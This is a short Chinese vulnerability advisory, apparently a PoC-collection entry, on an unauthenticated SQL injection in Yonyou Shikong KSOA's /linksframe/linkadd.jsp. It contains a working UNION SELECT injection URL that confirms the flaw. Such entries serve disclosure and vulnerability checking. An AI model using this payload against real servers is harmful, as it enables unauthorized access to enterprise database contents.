# 用友时空KSOA SQL注入漏洞

>   用友时空KSOA是建立在SOA理念指导下研发的新一代产品，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。

## 简介

用友时空KSOA的/linksframe/linkadd.jsp接口处存在sql注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息。

## 漏洞类型

SQL注入

## 影响范围

-   用友时空KSOA

## POC

```http
{URL}/linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%271%27%29%29%2Cnull%2Cnull%2C%27
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。